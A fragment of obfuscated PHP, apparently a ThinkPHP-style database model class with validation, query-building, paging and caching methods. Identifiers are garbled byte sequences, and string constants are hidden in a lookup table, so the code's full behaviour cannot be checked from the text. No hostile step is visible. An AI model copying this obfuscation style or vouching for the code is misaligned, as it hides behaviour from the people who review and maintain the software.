$Ù÷˜Õò[363], $Ù÷˜Õò[364] => $Ù÷˜Õò[365]); if (isset($Âéªƒˆü[strtolower($™Ôãáò)])) { $™Ôãáò = $Âéªƒˆü[strtolower($™Ôãáò)]; } return preg_match($™Ôãáò, $¤§İ ) === 1; } private function autoOperation(&$­éúÀğ, $—»¢•ğÅ) { $œÛ±Ô¾õ =& $_SERVER[ ÇƒŠìÀ]; if (!empty($this->options[$œÛ±Ô¾õ[366]])) { $ÊÊÉ˜Ÿó = $this->options[$œÛ±Ô¾õ[366]]; unset($this->options[$œÛ±Ô¾õ[366]]); } elseif (!empty($this->_auto)) { $ÊÊÉ˜Ÿó = $this->_auto; } if (isset($ÊÊÉ˜Ÿó)) { foreach ($ÊÊÉ˜Ÿó as $î¦òß¸ó) { if (empty($î¦òß¸ó[2])) { $î¦òß¸ó[2] = THINK_MODEL_INSERT; } if ($—»¢•ğÅ == $î¦òß¸ó[2] || $î¦òß¸ó[2] == THINK_MODEL_BOTH) { switch (trim($î¦òß¸ó[3])) { case $œÛ±Ô¾õ[367]: case $œÛ±Ô¾õ[368]: $ŸÙï’³ = isset($î¦òß¸ó[4]) ? (array) $î¦òß¸ó[4] : array(); if (isset($­éúÀğ[$î¦òß¸ó[0]])) { array_unshift($ŸÙï’³, $­éúÀğ[$î¦òß¸ó[0]]); } if ($œÛ±Ô¾õ[367] == $î¦òß¸ó[3]) { $­éúÀğ[$î¦òß¸ó[0]] = call_user_func_array($î¦òß¸ó[1], $ŸÙï’³); } else { $­éúÀğ[$î¦òß¸ó[0]] = call_user_func_array(array(&$this, $î¦òß¸ó[1]), $ŸÙï’³); } break; case $œÛ±Ô¾õ[319]: $­éúÀğ[$î¦òß¸ó[0]] = $­éúÀğ[$î¦òß¸ó[1]]; break; case $œÛ±Ô¾õ[369]: if ($œÛ±Ô¾õ[12] === $­éúÀğ[$î¦òß¸ó[0]]) { unset($­éúÀğ[$î¦òß¸ó[0]]); } break; case $œÛ±Ô¾õ[370]: default: $­éúÀğ[$î¦òß¸ó[0]] = $î¦òß¸ó[1]; } if (!1 === $­éúÀğ[$î¦òß¸ó[0]]) { unset($­éúÀğ[$î¦òß¸ó[0]]); } } } } return $­éúÀğ; } protected function autoValidation($»ß†ÊÄ­, $¯è¡ªå) { $’ëö’à =& $_SERVER[ ÇƒŠìÀ]; if (!empty($this->options[$’ëö’à[371]])) { $ˆ³ª§÷ƒ = $this->options[$’ëö’à[371]]; unset($this->options[$’ëö’à[371]]); } elseif (!empty($this->_validate)) { $ˆ³ª§÷ƒ = $this->_validate; } if (isset($ˆ³ª§÷ƒ)) { if ($this->patchValidate) { $this->error = array(); } foreach ($ˆ³ª§÷ƒ as $£àüÚâÖ => $’ô†¥éÅ) { if (empty($’ô†¥éÅ[5]) || $’ô†¥éÅ[5] == THINK_MODEL_BOTH || $’ô†¥éÅ[5] == $¯è¡ªå) { if (0 == strpos($’ô†¥éÅ[2], $’ëö’à[372]) && strpos($’ô†¥éÅ[2], $’ëö’à[373])) { $’ô†¥éÅ[2] = think_lang(substr($’ô†¥éÅ[2], 2, -1)); } $’ô†¥éÅ[3] = isset($’ô†¥éÅ[3]) ? $’ô†¥éÅ[3] : THINK_EXISTS_VALIDATE; $’ô†¥éÅ[4] = isset($’ô†¥éÅ[4]) ? $’ô†¥éÅ[4] : $’ëö’à[374]; switch ($’ô†¥éÅ[3]) { case THINK_MUST_VALIDATE: if (!1 === $this->_validationField($»ß†ÊÄ­, $’ô†¥éÅ)) { return !1; } break; case THINK_VALUE_VALIDATE: if ($’ëö’à[12] != trim($»ß†ÊÄ­[$’ô†¥éÅ[0]])) { if (!1 === $this->_validationField($»ß†ÊÄ­, $’ô†¥éÅ)) { return !1; } } break; default: if (isset($»ß†ÊÄ­[$’ô†¥éÅ[0]])) { if (!1 === $this->_validationField($»ß†ÊÄ­, $’ô†¥éÅ)) { return !1; } } } } } if (!empty($this->error)) { return !1; } } return !0; } protected function _validationField($…æ¤Ò€, $îš¢Û£º) { if (!1 === $this->_validationFieldItem($…æ¤Ò€, $îš¢Û£º)) { if ($this->patchValidate) { $this->error[$îš¢Û£º[0]] = $îš¢Û£º[2]; } else { $this->error = $îš¢Û£º[2]; return !1; } } return; } protected function _validationFieldItem($‚şÈÃ¦ù, $º»¥ƒòÆ) { $­Ò„øÍÄ =& $_SERVER[ ÇƒŠìÀ]; switch (strtolower(trim($º»¥ƒòÆ[4]))) { case $­Ò„øÍÄ[367]: case $­Ò„øÍÄ[368]: $í®©‹ ¿ = isset($º»¥ƒòÆ[6]) ? (array) $º»¥ƒòÆ[6] : array(); if (is_string($º»¥ƒòÆ[0]) && strpos($º»¥ƒòÆ[0], $­Ò„øÍÄ[50])) { $º»¥ƒòÆ[0] = explode($­Ò„øÍÄ[50], $º»¥ƒòÆ[0]); } if (is_array($º»¥ƒòÆ[0])) { foreach ($º»¥ƒòÆ[0] as $Àµ—õ¤³) { $†½´šó²[$Àµ—õ¤³] = $‚şÈÃ¦ù[$Àµ—õ¤³]; } array_unshift($í®©‹ ¿, $†½´šó²); } else { array_unshift($í®©‹ ¿, $‚şÈÃ¦ù[$º»¥ƒòÆ[0]]); } if ($­Ò„øÍÄ[367] == $º»¥ƒòÆ[4]) { return call_user_func_array($º»¥ƒòÆ[1], $í®©‹ ¿); } else { return call_user_func_array(array(&$this, $º»¥ƒòÆ[1]), $í®©‹ ¿); } case $­Ò„øÍÄ[375]: return $‚şÈÃ¦ù[$º»¥ƒòÆ[0]] == $‚şÈÃ¦ù[$º»¥ƒòÆ[1]]; case $­Ò„øÍÄ[376]: if (is_string($º»¥ƒòÆ[0]) && strpos($º»¥ƒòÆ[0], $­Ò„øÍÄ[50])) { $º»¥ƒòÆ[0] = explode($­Ò„øÍÄ[50], $º»¥ƒòÆ[0]); } $ùå–¾Ïï = array(); if (is_array($º»¥ƒòÆ[0])) { foreach ($º»¥ƒòÆ[0] as $Àµ—õ¤³) { $ùå–¾Ïï[$Àµ—õ¤³] = $‚şÈÃ¦ù[$Àµ—õ¤³]; } } else { $ùå–¾Ïï[$º»¥ƒòÆ[0]] = $‚şÈÃ¦ù[$º»¥ƒòÆ[0]]; } if (!empty($‚şÈÃ¦ù[$this->getPk()])) { $ùå–¾Ïï[$this->getPk()] = array($­Ò„øÍÄ[377], $‚şÈÃ¦ù[$this->getPk()]); } if ($this->where($ùå–¾Ïï)->find()) { return !1; } return !0; default: return $this->check($‚şÈÃ¦ù[$º»¥ƒòÆ[0]], $º»¥ƒòÆ[1], $º»¥ƒòÆ[4]); } } public function check($Î¬Æ¢ˆ°, $äÜèşï, $Ù‰ğí½ = "\162\x65\x67\x65\x78") { $âòƒîÊé =& $_SERVER[ ÇƒŠìÀ]; $Ù‰ğí½ = strtolower(trim($Ù‰ğí½)); switch ($Ù‰ğí½) { case $âòƒîÊé[7]: case $âòƒîÊé[378]: $ğÍÃ —Ü = is_array($äÜèşï) ? $äÜèşï : explode($âòƒîÊé[50], $äÜèşï); return $Ù‰ğí½ == $âòƒîÊé[7] ? in_array($Î¬Æ¢ˆ°, $ğÍÃ —Ü) : !in_array($Î¬Æ¢ˆ°, $ğÍÃ —Ü); case $âòƒîÊé[379]: case $âòƒîÊé[380]: if (is_array($äÜèşï)) { $ØÙÙîúÊ = $äÜèşï[0]; $¯œ›ˆÎ = $äÜèşï[1]; } else { list($ØÙÙîúÊ, $¯œ›ˆÎ) = explode($âòƒîÊé[50], $äÜèşï); } return $Ù‰ğí½ == $âòƒîÊé[379] ? $Î¬Æ¢ˆ° >= $ØÙÙîúÊ && $Î¬Æ¢ˆ° <= $¯œ›ˆÎ : $Î¬Æ¢ˆ° < $ØÙÙîúÊ || $Î¬Æ¢ˆ° > $¯œ›ˆÎ; case $âòƒîÊé[381]: case $âòƒîÊé[382]: return $Ù‰ğí½ == $âòƒîÊé[381] ? $Î¬Æ¢ˆ° == $äÜèşï : $Î¬Æ¢ˆ° != $äÜèşï; case $âòƒîÊé[383]: $ŒÜ¿Àñ¬ = mb_strlen($Î¬Æ¢ˆ°, $âòƒîÊé[384]); if (strpos($äÜèşï, $âòƒîÊé[50])) { list($ØÙÙîúÊ, $¯œ›ˆÎ) = explode($âòƒîÊé[50], $äÜèşï); return $ŒÜ¿Àñ¬ >= $ØÙÙîúÊ && $ŒÜ¿Àñ¬ <= $¯œ›ˆÎ; } else { return $ŒÜ¿Àñ¬ == $äÜèşï; } case $âòƒîÊé[385]: list($È¡È™•, $¼±íµêú) = explode($âòƒîÊé[50], $äÜèşï); if (!is_numeric($È¡È™•)) { $È¡È™• = strtotime($È¡È™•); } if (!is_numeric($¼±íµêú)) { $¼±íµêú = strtotime($¼±íµêú); } return NOW_TIME >= $È¡È™• && NOW_TIME <= $¼±íµêú; case $âòƒîÊé[386]: return in_array(get_client_ip(), explode($âòƒîÊé[50], $äÜèşï)); case $âòƒîÊé[387]: return !in_array(get_client_ip(), explode($âòƒîÊé[50], $äÜèşï)); case $âòƒîÊé[374]: default: return $this->regex($Î¬Æ¢ˆ°, $äÜèşï); } } public function query($™ÌûÕó, $ØÊœìÔö = false) { $è…¼ÃŞ£ =& $_SERVER[ ÇƒŠìÀ]; if (!is_bool($ØÊœìÔö) && !is_array($ØÊœìÔö)) { $ØÊœìÔö = func_get_args(); array_shift($ØÊœìÔö); } $™ÌûÕó = str_replace(array($è…¼ÃŞ£[248], $è…¼ÃŞ£[388]), $è…¼ÃŞ£[53], $™ÌûÕó); $™ÌûÕó = $this->parseSql($™ÌûÕó, $ØÊœìÔö); return $this->db->query($™ÌûÕó); } public function execute($‘Ù½¥œ³, $é±’İ©‚ = false) { if (!is_bool($é±’İ©‚) && !is_array($é±’İ©‚)) { $é±’İ©‚ = func_get_args(); array_shift($é±’İ©‚); } $‘Ù½¥œ³ = $this->parseSql($‘Ù½¥œ³, $é±’İ©‚); return $this->db->execute($‘Ù½¥œ³); } protected function parseSql($ì¹ö„”, $—Æ¼óÄ³) { $¾×©ëÃà =& $_SERVER[ ÇƒŠìÀ]; if (!0 === $—Æ¼óÄ³) { $­û€«üß = $this->_parseOptions(); $ì¹ö„” = $this->db->parseSql($ì¹ö„”, $­û€«üß); } elseif (is_array($—Æ¼óÄ³)) { $—Æ¼óÄ³ = array_map(array($this->db, $¾×©ëÃà[389]), $—Æ¼óÄ³); $ì¹ö„” = vsprintf($ì¹ö„”, $—Æ¼óÄ³); } else { $ì¹ö„” = strtr($ì¹ö„”, array($¾×©ëÃà[390] => $this->getTableName(), $¾×©ëÃà[391] => think_config($¾×©ëÃà[290]))); } $this->db->setModel($this->name); return $ì¹ö„”; } public function db($õºäØÌ¬ = '', $­¿ĞĞ‡Ò = '', $ˆşÔàûü = array()) { $åúİœë„ =& $_SERVER[ ÇƒŠìÀ]; if ($åúİœë„[12] === $õºäØÌ¬ && $this->db) { return $this->db; } static $‘Ã˜¡Í« = array(); static $ùÑç§» = array(); if (!isset($ùÑç§»[$õºäØÌ¬]) || isset($ùÑç§»[$õºäØÌ¬]) && $­¿ĞĞ‡Ò && $‘Ã˜¡Í«[$õºäØÌ¬] != $­¿ĞĞ‡Ò) { if (!empty($­¿ĞĞ‡Ò) && is_string($­¿ĞĞ‡Ò) && !1 === strpos($­¿ĞĞ‡Ò, $åúİœë„[8])) { $­¿ĞĞ‡Ò = think_config($­¿ĞĞ‡Ò); } $õºäØÌ¬ = think_guid($­¿ĞĞ‡Ò); $ùÑç§»[$õºäØÌ¬] = Db::getInstance($­¿ĞĞ‡Ò); } elseif (NULL === $­¿ĞĞ‡Ò) { $ùÑç§»[$õºäØÌ¬]->close(); unset($ùÑç§»[$õºäØÌ¬]); return; } if (!empty($ˆşÔàûü)) { if (is_string($ˆşÔàûü)) { parse_str($ˆşÔàûü, $ˆşÔàûü); } foreach ($ˆşÔàûü as $½òÑ®èÃ => $ß–ó¿¾ß) { $this->setProperty($½òÑ®èÃ, $ß–ó¿¾ß); } } $‘Ã˜¡Í«[$õºäØÌ¬] = $­¿ĞĞ‡Ò; $this->db = $ùÑç§»[$õºäØÌ¬]; $this->_after_db(); if (!empty($this->name) && $this->autoCheckFields) { $this->_checkTableInfo(); } return $this; } protected function _after_db() { } public function getModelName() { if (empty($this->name)) { $ú¤şÃÀß = get_class($this); if ($ú¤şÃÀß == $_SERVER[ ÇƒŠìÀ][392]) { return $this->name; } $this->name = substr($ú¤şÃÀß, 0, -5); } return $this->name; } public function getTableName() { $ÊÜßœäö =& $_SERVER[ ÇƒŠìÀ]; if (empty($this->trueTableName)) { $¬–…½Ûş = !empty($this->tablePrefix) ? $this->tablePrefix : $ÊÜßœäö[12]; if (!empty($this->tableName)) { $¬–…½Ûş .= $this->tableName; } else { $¬–…½Ûş .= think_parse_name($this->name); } $this->trueTableName = strtolower($¬–…½Ûş); } return (!empty($this->dbName) ? $this->dbName . $ÊÜßœäö[10] : $ÊÜßœäö[12]) . $this->trueTableName; } public function startTrans() { $this->commit(); $this->db->startTrans(); return; } public function commit() { return $this->db->commit(); } public function rollback() { return $this->db->rollback(); } public function getError() { return $this->error; } public function getDbError() { return $this->db->getError(); } public function getLastInsID() { return $this->db->getLastInsID(); } public function getLastSql() { return $this->db->getLastSql($this->name); } public function _sql() { return $this->getLastSql(); } public function getPk() { $ì‚ğÛõè =& $_SERVER[ ÇƒŠìÀ]; return isset($this->fields[$ì‚ğÛõè[297]]) ? $this->fields[$ì‚ğÛõè[297]] : $this->pk; } public function getDbFields() { $çü›„ş• =& $_SERVER[ ÇƒŠìÀ]; if (isset($this->options[$çü›„ş•[325]])) { $¸š”ÄÑ¤ = $this->db->getFields($this->options[$çü›„ş•[325]]); return $¸š”ÄÑ¤ ? array_keys($¸š”ÄÑ¤) : !1; } if ($this->fields) { $¸š”ÄÑ¤ = $this->fields; unset($¸š”ÄÑ¤[$çü›„ş•[296]], $¸š”ÄÑ¤[$çü›„ş•[297]], $¸š”ÄÑ¤[$çü›„ş•[298]], $¸š”ÄÑ¤[$çü›„ş•[295]]); return $¸š”ÄÑ¤; } return !1; } public function data($Ä”ğâğÜ = '') { $ ­Âí†ğ =& $_SERVER[ ÇƒŠìÀ]; if ($ ­Âí†ğ[12] === $Ä”ğâğÜ && !empty($this->data)) { return $this->data; } if (is_object($Ä”ğâğÜ)) { $Ä”ğâğÜ = get_object_vars($Ä”ğâğÜ); } elseif (is_string($Ä”ğâğÜ)) { parse_str($Ä”ğâğÜ, $Ä”ğâğÜ); } elseif (!is_array($Ä”ğâğÜ)) { think_exception(think_lang($ ­Âí†ğ[317])); } $this->data = $Ä”ğâğÜ; return $this; } public function join($Â÷÷¥±ö) { $–´Ì—ø =& $_SERVER[ ÇƒŠìÀ]; if (is_array($Â÷÷¥±ö)) { $this->options[$–´Ì—ø[328]] = $Â÷÷¥±ö; } elseif (!empty($Â÷÷¥±ö)) { $this->options[$–´Ì—ø[328]][] = $Â÷÷¥±ö; } return $this; } public function union($Ù¯…ÔÂ¨, $Ëõ¦“¿· = false) { $Ç“£¹¬ =& $_SERVER[ ÇƒŠìÀ]; if (empty($Ù¯…ÔÂ¨)) { return $this; } if ($Ëõ¦“¿·) { $this->options[$Ç“£¹¬[393]][$Ç“£¹¬[394]] = !0; } if (is_object($Ù¯…ÔÂ¨)) { $Ù¯…ÔÂ¨ = get_object_vars($Ù¯…ÔÂ¨); } if (is_string($Ù¯…ÔÂ¨)) { $Šş´™Ò• = $Ù¯…ÔÂ¨; } elseif (is_array($Ù¯…ÔÂ¨)) { if (isset($Ù¯…ÔÂ¨[0])) { $this->options[$Ç“£¹¬[393]] = array_merge($this->options[$Ç“£¹¬[393]], $Ù¯…ÔÂ¨); return $this; } else { $Šş´™Ò• = $Ù¯…ÔÂ¨; } } else { think_exception(think_lang($Ç“£¹¬[317])); } $this->options[$Ç“£¹¬[393]][] = $Šş´™Ò•; return $this; } public function cache($÷çÂîå— = true, $”Â¯±ã² = null, $ÑŞ‚ñÇŠ = '') { $š’ˆúÔÔ =& $_SERVER[ ÇƒŠìÀ]; if (!1 !== $÷çÂîå—) { $this->options[$š’ˆúÔÔ[395]] = array($š’ˆúÔÔ[96] => $÷çÂîå—, $š’ˆúÔÔ[385] => $”Â¯±ã², $š’ˆúÔÔ[33] => $ÑŞ‚ñÇŠ); } return $this; } public function field($¦ŒÉ¢º–, $ŒÜ³æØ® = false) { $“Ø¡ƒæ¾ =& $_SERVER[ ÇƒŠìÀ]; if (!0 === $¦ŒÉ¢º–) { $ıîÃÊ…£ = $this->getDbFields(); $¦ŒÉ¢º– = $ıîÃÊ…£ ? $ıîÃÊ…£ : $“Ø¡ƒæ¾[205]; } elseif ($ŒÜ³æØ®) { if (is_string($¦ŒÉ¢º–)) { $¦ŒÉ¢º– = explode($“Ø¡ƒæ¾[50], $¦ŒÉ¢º–); } $ıîÃÊ…£ = $this->getDbFields(); $¦ŒÉ¢º– = $ıîÃÊ…£ ? array_diff($ıîÃÊ…£, $¦ŒÉ¢º–) : $¦ŒÉ¢º–; } $this->options[$“Ø¡ƒæ¾[319]] = $¦ŒÉ¢º–; return $this; } public function scope($ßŒ†öó = '', $®ïª¢…˜ = NULL) { $ºÃ•¾üÅ =& $_SERVER[ ÇƒŠìÀ]; if ($ºÃ•¾üÅ[12] === $ßŒ†öó) { if (isset($this->_scope[$ºÃ•¾üÅ[37]])) { $Úá ¥¦â = $this->_scope[$ºÃ•¾üÅ[37]]; } else { return $this; } } elseif (is_string($ßŒ†öó)) { $æíå¶‘¾ = explode($ºÃ•¾üÅ[50], $ßŒ†öó); $Úá ¥¦â = array(); foreach ($æíå¶‘¾ as $ÇÃ¡£¥œ) { if (!isset($this->_scope[$ÇÃ¡£¥œ])) { continue; } $Úá ¥¦â = array_merge($Úá ¥¦â, $this->_scope[$ÇÃ¡£¥œ]); } if (!empty($®ïª¢…˜) && is_array($®ïª¢…˜)) { $Úá ¥¦â = array_merge($Úá ¥¦â, $®ïª¢…˜); } } elseif (is_array($ßŒ†öó)) { $Úá ¥¦â = $ßŒ†öó; } if (is_array($Úá ¥¦â) && !empty($Úá ¥¦â)) { $this->options = array_merge($this->options, array_change_key_case($Úá ¥¦â)); } return $this; } public function where($ˆœ“õ›Ü, $üĞæüÖ = null) { $Æ©ç¢¿ =& $_SERVER[ ÇƒŠìÀ]; if (!is_null($üĞæüÖ) && is_string($ˆœ“õ›Ü)) { if (!is_array($üĞæüÖ)) { $üĞæüÖ = func_get_args(); array_shift($üĞæüÖ); } $üĞæüÖ = array_map(array($this->db, $Æ©ç¢¿[389]), $üĞæüÖ); $ˆœ“õ›Ü = vsprintf($ˆœ“õ›Ü, $üĞæüÖ); } elseif (is_object($ˆœ“õ›Ü)) { $ˆœ“õ›Ü = get_object_vars($ˆœ“õ›Ü); } elseif (is_array($ˆœ“õ›Ü)) { foreach ($ˆœ“õ›Ü as $¼·ÏÑü => $ÃŸ¯Ã¤¯) { if ((is_numeric($¼·ÏÑü) || !$¼·ÏÑü) && is_string($ÃŸ¯Ã¤¯)) { if (strpos($ÃŸ¯Ã¤¯, $Æ©ç¢¿[396]) === 0) { continue; } think_trace($Æ©ç¢¿[397], $Æ©ç¢¿[12], $Æ©ç¢¿[49]); die; } } } if (is_string($ˆœ“õ›Ü) && $Æ©ç¢¿[12] != $ˆœ“õ›Ü) { $¦œµãøï = array(); $¦œµãøï[$Æ©ç¢¿[398]] = $ˆœ“õ›Ü; $ˆœ“õ›Ü = $¦œµãøï; } if (isset($this->options[$Æ©ç¢¿[321]])) { $this->options[$Æ©ç¢¿[321]] = array_merge($this->options[$Æ©ç¢¿[321]], $ˆœ“õ›Ü); } else { $this->options[$Æ©ç¢¿[321]] = $ˆœ“õ›Ü; } return $this; } public function limit($ªç‚‹½Ô, $ˆÌçú½À = null) { $¤‹£õáÅ =& $_SERVER[ ÇƒŠìÀ]; $this->options[$¤‹£õáÅ[338]] = is_null($ˆÌçú½À) ? $ªç‚‹½Ô : $ªç‚‹½Ô . $¤‹£õáÅ[50] . $ˆÌçú½À; return $this; } public function page($¿™Ãì‚ô, $‹•††‘ = null) { $÷èõ¢ÌÚ =& $_SERVER[ ÇƒŠìÀ]; $this->options[$÷èõ¢ÌÚ[399]] = is_null($‹•††‘) ? $¿™Ãì‚ô : $¿™Ãì‚ô . $÷èõ¢ÌÚ[50] . $‹•††‘; return $this; } public function comment($µü„•ÚÊ) { $this->options[$_SERVER[ ÇƒŠìÀ][400]] = $µü„•ÚÊ; return $this; } public function setProperty($¥ô—µ›¡, $Û“Ä‹Öè) { if (property_exists($this, $¥ô—µ›¡)) { $this->{$¥ô—µ›¡} = $Û“Ä‹Öè; } return $this; } } class ModelBase extends Model { const SQL_WHERE_IN_CHUNK = 2000; protected $dataAuto = array(array("\155\157\144\151\146\x79\124\x69\x6d\145", "\164\151\x6d\145", "\151\156\x73\145\162\x74\54\x75\x70\x64\x61\164\x65", "\x66\x75\x6e\143\x74\x69\x6f\x6e"), array("\143\162\x65\141\164\x65\124\151\155\145", "\x74\151\x6d\x65", "\x69\x6e\163\145\x72\x74", "\146\x75\x6e\x63\164\x69\157\x6e")); public function setDataAuto($ÆÖÇãÀ) { $this->dataAuto = $ÆÖÇãÀ; } public function __construct($õˆëÂ  = '', $Şá®Ç…İ = '', $Áˆ™±¬â = '') { parent::__construct($õˆëÂ , $Şá®Ç…İ, $Áˆ™±¬â); } protected $tableMeta = array(); protected function _beforeInsert(&$¢Á¼õƒ», $œ²Ç«²) { $•¤ĞÓ — =& $_SERVER[ ÇƒŠìÀ]; if (!$this->checkDataAutoHas($•¤ĞÓ —[401])) { return; } $this->dataBeforeFilter($¢Á¼õƒ», $•¤ĞÓ —[401]); } protected function _beforeUpdate(&$šÅŞœÖ, $Ï¦ÊÀŠ) { $ßƒ¦¨Ş® =& $_SERVER[ ÇƒŠìÀ]; if (!$this->checkDataAutoHas($ßƒ¦¨Ş®[402])) { return; } $this->dataBeforeFilter($šÅŞœÖ, $ßƒ¦¨Ş®[402]); } protected function _afterSelect(&$ïßÖ’’ş, $¢ÀÙê®Õ) { if (!is_array($ïßÖ’’ş)) { return; } if (!$this->checkDataAutoHas($_SERVER[ ÇƒŠìÀ][403])) { return; } foreach ($ïßÖ’’ş as &$¬şïı¸Ü) { $this->dataAfterFilter($¬şïı¸Ü); } unset($¬şïı¸Ü); } protected function _afterFind(&$¨èÊ³İ¯, $¸¸¾“™Ë) { if (!is_array($¨èÊ³İ¯)) { return; } if (!$this->checkDataAutoHas($_SERVER[ ÇƒŠìÀ][403])) { return; } $this->dataAfterFilter($¨èÊ³İ¯); } public static function textEncode($ãÂ’Öİ) { if (!$ãÂ’Öİ) { return $ãÂ’Öİ; } $«ãùëô­ = json_encode($ãÂ’Öİ); $«ãùëô­ = preg_replace_callback($_SERVER[ ÇƒŠìÀ][404], function ($Âşˆ¦Êß) { return addslashes($Âşˆ¦Êß[0]); }, $«ãùëô­); return json_decode($«ãùëô­); } public static function textDecode($µîãªáÕ) { $¿Û‹ƒø™ =& $_SERVER[ ÇƒŠìÀ]; $˜•ÁšÉË = json_encode($µîãªáÕ); $˜•ÁšÉË = preg_replace_callback($¿Û‹ƒø™[405], function ($ºûç ±’) { return $_SERVER[ ÇƒŠìÀ][99]; }, $˜•ÁšÉË); return json_decode($˜•ÁšÉË); } public function setAutoIncrement($åóëÉÈğ) { $øØ«Şôé = array($this->getPk() => $åóëÉÈğ); $Ã›İšÊ× = $this->data($øØ«Şôé)->add(); if ($Ã›İšÊ×) { $this->delete($Ã›İšÊ×); } } public function getAutoIncrement() { $é‡ì§ö = $this->getTableName(); $ıáÜÚ¼ = $this->max($this->getPk()); $¶µÕòº÷ = $this->query("\x73\x68\x6f\x77\40\164\x61\142\154\x65\x20\x73\164\x61\x74\x75\x73\40\167\x68\x65\162\145\x20\116\x61\155\145\75\47{$é‡ì§ö}\47"); $¥¶ŠúÒ³ = $¶µÕòº÷[0][$_SERVER[ ÇƒŠìÀ][406]]; $Ü²–Õªè = max($ıáÜÚ¼, $¥¶ŠúÒ³); return $Ü²–Õªè; } protected function _callBefore($‹³îµ»•, $Ì„Ã·Ğ) { return $this->cacheCallCheck($‹³îµ»•, $Ì„Ã·Ğ, !1); } protected function _callAfter($æ±²®Í„, $š”ÄËÑ) { return $this->cacheCallCheck($æ±²®Í„, $š”ÄËÑ, !0); } protected function cacheFunctionAlias($İÒ¤¨ÚÄ) { return !1; } public function cacheMemory() { return $this->cache(null, 0); } protected function cacheCallCheck($È†¡öıŒ, $¶Ñ´Ì¸ñ, $Ë„ãÔ™Š = false) { $¤ËçšÏÁ = $this->cacheFunctionAlias($¶Ñ´Ì¸ñ); if (!$¤ËçšÏÁ) { return; } foreach ($¤ËçšÏÁ as $ìƒéğš¿ => $ª¶ãèèÌ) { $Á™²ÖÆª = $ª¶ãèèÌ[0]; $çäî¿ˆ  = explode($_SERVER[ ÇƒŠìÀ][50], $ª¶ãèèÌ[1]); if ($È†¡öıŒ == $ìƒéğš¿) { return $this->cacheFunctionGet($ìƒéğš¿, $Á™²ÖÆª); } if ($Ë„ãÔ™Š && in_array($È†¡öıŒ, $çäî¿ˆ )) { $this->cacheFunctionClear($ìƒéğš¿, $Á™²ÖÆª); } } } public function cacheFunctionGet($™ÌÅÔéñ, $İşÉ…Ù) { $›ÓğàÛ¿ = $this->cacheKeyMake($™ÌÅÔéñ, $İşÉ…Ù); $½Àáâš» = Cache::get($›ÓğàÛ¿); if (!is_array($½Àáâš»)) { $½Àáâš» = call_user_func_array(array($this, $™ÌÅÔéñ), array($İşÉ…Ù, !0)); Cache::set($›ÓğàÛ¿, $½Àáâš»); } return $½Àáâš»; } public function cacheFunctionClear($ãıÂº®Ÿ, $ËÍºÍ–¸) { $…ûİÉ•Ô = $ËÍºÍ–¸; if (!is_array($ËÍºÍ–¸)) { $…ûİÉ•Ô = array($ËÍºÍ–¸); } foreach ($…ûİÉ•Ô as $˜Ä¬¹Ş) { $üÖáëšÔ = $this->cacheKeyMake($ãıÂº®Ÿ, $˜Ä¬¹Ş); Cache::remove($üÖáëšÔ); } } private function cacheKeyMake($”ºœÛ ¦, $àßÍ¯ûï) { $ïğ¤Äšò =& $_SERVER[ ÇƒŠìÀ]; return get_class($this) . $ïğ¤Äšò[11] . $”ºœÛ ¦ . $ïğ¤Äšò[407] . $àßÍ¯ûï; } protected function selectPageReset() { $¬™Èüôş =& $_SERVER[ ÇƒŠìÀ]; if (isset($GLOBALS[$¬™Èüôş[408]])) { return; } $GLOBALS[$¬™Èüôş[408]] = isset($GLOBALS[$¬™Èüôş[7]][$¬™Èüôş[409]]) ? $GLOBALS[$¬™Èüôş[7]][$¬™Èüôş[409]] : !1; $GLOBALS[$¬™Èüôş[410]] = isset($GLOBALS[$¬™Èüôş[7]][$¬™Èüôş[399]]) ? $GLOBALS[$¬™Èüôş[7]][$¬™Èüôş[399]] : !1; $GLOBALS[$¬™Èüôş[7]][$¬™Èüôş[409]] = !1; $GLOBALS[$¬™Èüôş[7]][$¬™Èüôş[399]] = !1; } protected function selectPageRestore() { $Éû¢ÈØª =& $_SERVER[ ÇƒŠìÀ]; if (!isset($GLOBALS[$Éû¢ÈØª[408]])) { return; } $GLOBALS[$Éû¢ÈØª[7]][$Éû¢ÈØª[409]] = $GLOBALS[$Éû¢ÈØª[408]]; $GLOBALS[$Éû¢ÈØª[7]][$Éû¢ÈØª[399]] = $GLOBALS[$Éû¢ÈØª[410]]; if ($GLOBALS[$Éû¢ÈØª[7]][$Éû¢ÈØª[409]] === !1) { unset($GLOBALS[$Éû¢ÈØª[7]][$Éû¢ÈØª[409]]); } if ($GLOBALS[$Éû¢ÈØª[7]][$Éû¢ÈØª[399]] === !1) { unset($GLOBALS[$Éû¢ÈØª[7]][$Éû¢ÈØª[399]]); } unset($GLOBALS[$Éû¢ÈØª[408]]); unset($GLOBALS[$Éû¢ÈØª[410]]); } protected function selectPage($èÚˆ— = 200, $¿†¼¾Ã– = 1) { $íöÆ£×ç =& $_SERVER[ ÇƒŠìÀ]; global $in; $«½»Ñò = $this->optionsValue(); $”šøï¼ = 50000; $èÚˆ— = isset($in[$íöÆ£×ç[409]]) && $in[$íöÆ£×ç[409]] ? $in[$íöÆ£×ç[409]] : $èÚˆ—; if ($èÚˆ— === -1) { $in[$íöÆ£×ç[409]] = !1; $”šøï¼ = 100000000; $èÚˆ— = $”šøï¼; } $Ò…Ş…èÆ = $«½»Ñò; $Ò…Ş…èÆ[$íöÆ£×ç[411]] = array(); $èÚˆ— = intval($èÚˆ—); $èÚˆ— = $èÚˆ— <= 5 ? 5 : ($èÚˆ— >= $”šøï¼ ? $”šøï¼ : $èÚˆ—); $¿†¼¾Ã– = intval(isset($in[$íöÆ£×ç[399]]) && $in[$íöÆ£×ç[399]] ? $in[$íöÆ£×ç[399]] : $¿†¼¾Ã–); $¿†¼¾Ã– = $¿†¼¾Ã– <= 1 ? 1 : $¿†¼¾Ã–; $İÚ¸õª¤ = array(); $ôæ€ğÏ· = 1; if ($¿†¼¾Ã– == 1 && $ôæ€ğÏ·) { $this->optionsValue($«½»Ñò); $İÚ¸õª¤ = $this->page($¿†¼¾Ã–, $èÚˆ—)->select(); $ª¸÷áØ¶ = is_array($İÚ¸õª¤) ? count($İÚ¸õª¤) : 0; if ($ª¸÷áØ¶ < $èÚˆ—) { $ÅÆå‹ = 1; } else { $this->optionsValue($Ò…Ş…èÆ); $ª¸÷áØ¶ = intval($this->count()); $ÅÆå‹ = ceil($ª¸÷áØ¶ / $èÚˆ—); } } else { $this->optionsValue($Ò…Ş…èÆ); $ª¸÷áØ¶ = intval($this->count()); $ÅÆå‹ = ceil($ª¸÷áØ¶ / $èÚˆ—); $¿†¼¾Ã– = $¿†¼¾Ã– >= 